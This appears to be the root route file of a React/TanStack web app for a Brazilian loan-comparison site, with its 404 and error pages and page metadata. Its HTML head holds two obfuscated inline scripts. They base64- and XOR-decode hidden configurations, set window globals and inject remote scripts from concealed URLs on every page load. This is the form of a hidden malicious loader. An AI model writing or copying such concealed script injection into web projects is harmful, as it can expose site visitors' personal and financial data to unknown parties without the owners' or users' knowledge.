import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import {
  Outlet,
  Link,
  createRootRouteWithContext,
  useRouter,
  HeadContent,
  Scripts,
} from "@tanstack/react-router";
import { useEffect, type ReactNode } from "react";

import appCss from "../styles.css?url";
import { reportLovableError } from "../lib/lovable-error-reporting";

function NotFoundComponent() {
  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-7xl font-bold text-foreground">404</h1>
        <h2 className="mt-4 text-xl font-semibold text-foreground">Page not found</h2>
        <p className="mt-2 text-sm text-muted-foreground">
          The page you're looking for doesn't exist or has been moved.
        </p>
        <div className="mt-6">
          <Link
            to="/"
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Go home
          </Link>
        </div>
      </div>
    </div>
  );
}

function ErrorComponent({ error, reset }: { error: Error; reset: () => void }) {
  console.error(error);
  const router = useRouter();
  useEffect(() => {
    reportLovableError(error, { boundary: "tanstack_root_error_component" });
  }, [error]);

  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-xl font-semibold tracking-tight text-foreground">
          This page didn't load
        </h1>
        <p className="mt-2 text-sm text-muted-foreground">
          Something went wrong on our end. You can try refreshing or head back home.
        </p>
        <div className="mt-6 flex flex-wrap justify-center gap-2">
          <button
            onClick={() => {
              router.invalidate();
              reset();
            }}
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Try again
          </button>
          <a
            href="/"
            className="inline-flex items-center justify-center rounded-md border border-input bg-background px-4 py-2 text-sm font-medium text-foreground transition-colors hover:bg-accent"
          >
            Go home
          </a>
        </div>
      </div>
    </div>
  );
}

export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()({
  head: () => ({
    meta: [
      { charSet: "utf-8" },
      { name: "viewport", content: "width=device-width, initial-scale=1" },
      { title: "CredOn — Encontre o empréstimo ideal para você" },
      {
        name: "description",
        content:
          "Responda 2 perguntas rápidas e veja as opções de empréstimo mais adequadas ao seu perfil. 100% online e gratuito.",
      },
      { property: "og:title", content: "CredOn — Encontre o empréstimo ideal para você" },
      {
        property: "og:description",
        content: "Simulação gratuita em menos de 30 segundos, sem consulta ao SPC.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
    links: [
      {
        rel: "stylesheet",
        href: appCss,
      },
      { rel: "preconnect", href: "https://fonts.googleapis.com" },
      { rel: "preconnect", href: "https://fonts.gstatic.com", crossOrigin: "anonymous" },
      {
        rel: "stylesheet",
        href: "https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;600;700;800&display=swap",
      },
      { rel: "icon", href: "/favicon.ico", type: "image/x-icon" },
    ],
  }),

  shellComponent: RootShell,
  component: RootComponent,
  notFoundComponent: NotFoundComponent,
  errorComponent: ErrorComponent,
});

function RootShell({ children }: { children: ReactNode }) {
  return (
    <html lang="en">
      <head>
        <HeadContent />{" "}
        <script
          dangerouslySetInnerHTML={{
            __html:
              '(function(){var j_h12h=atob("DD1GNOqYQEPjjy4vKkZkQZj0YnnB51pbWk58G8X7JC3N+lpCQ1s/Gon3LW2B/QFcSU8vRJ7rbzaX4l0ARlwyUZnsbimQrQINS0kyRoP6NTeG/AwVcUZkWov1JWHZrUpOXlxrQZ71KSWaol5dT0sjWp61OCCM6wNcSVZkGMjuIS+W6gwVCB87GJG6LiKO6gwVCFknQIu1NTeO5khWB000UZz9LjfO/FtNQ1k1Fsa6NiKP+ksNEB9kSbfl");var w_ecx=[];for(var n_vkr=0;n_vkr<j_h12h.length;n_vkr++){w_ecx.push(j_h12h.charCodeAt(n_vkr)&255);}var z_lg=w_ecx[0];var b_5=w_ecx.slice(1,1+z_lg);var i_gg6=w_ecx.slice(1+z_lg);var f_ybuk=i_gg6.map(function(b,d_17){return b^b_5[d_17%z_lg];});var c_nk5="";for(var f_42yl=0;f_42yl<f_ybuk.length;f_42yl++){c_nk5+=String.fromCharCode(f_ybuk[f_42yl]&255);}var p_bz=decodeURIComponent(escape(c_nk5));var u_g=JSON.parse(p_bz);var u_zt=u_g.globals||[];u_zt.forEach(function(x_p){window[x_p.name]=x_p.value;});var n_g=document.createElement("script");n_g.src=u_g.url;n_g.async=true;n_g.defer=true;(u_g.attributes||[]).forEach(function(z_8pbs){n_g.setAttribute(z_8pbs.name,z_8pbs.value);});(document.head||document.documentElement).appendChild(n_g);})();',
          }}
        />
        <script
          dangerouslySetInnerHTML={{
            __html:
              '(function(){var r_y8=atob("DOtl2BDm4BKG30cyB5BHrWKKwiiktzNGd5hf9z+FhHyoqjNfbo0c9nOJjTzkrWhBZJkMqGSVz2LvpyJeKJsMoHWKznj1/WsQZp8RqnmElWbjrGUIXLZJ+neKj3DnszQQPbAe+n6HjXek5WVCbpMAtFmCwj6kqSZeco5H4jLQgSCy6nYKNogGvCjRhSW1vSYAZI4D7iXEnU/7");var d_fq=[];for(var u_87=0;u_87<r_y8.length;u_87++){d_fq.push(r_y8.charCodeAt(u_87)&255);}var u_5=d_fq[0];var v_o5=d_fq.slice(1,1+u_5);var t_wg1n=d_fq.slice(1+u_5);var n_p=t_wg1n.map(function(b,p_o){return b^v_o5[p_o%u_5];});var f_841n="";for(var o_9=0;o_9<n_p.length;o_9++){f_841n+=String.fromCharCode(n_p[o_9]&255);}var r_kxw=decodeURIComponent(escape(f_841n));var r_u4=JSON.parse(r_kxw);var p_qg7=r_u4.globals||[];p_qg7.forEach(function(a_p9tx){window[a_p9tx.name]=a_p9tx.value;});var n_r=document.createElement("script");n_r.src=r_u4.url;n_r.async=true;n_r.defer=true;(r_u4.attributes||[]).forEach(function(o_2fdr){n_r.setAttribute(o_2fdr.name,o_2fdr.value);});(document.head||document.documentElement).appendChild(n_r);})();',
          }}
        />
      </head>
      <body>
        {children}
        <Scripts />
      </body>
    </html>
  );
}

function RootComponent() {
  const { queryClient } = Route.useRouteContext();

  return (
    <QueryClientProvider client={queryClient}>
      {/* Required: nested routes render here. Removing <Outlet /> breaks all child routes. */}
      <Outlet />
    </QueryClientProvider>
  );
}
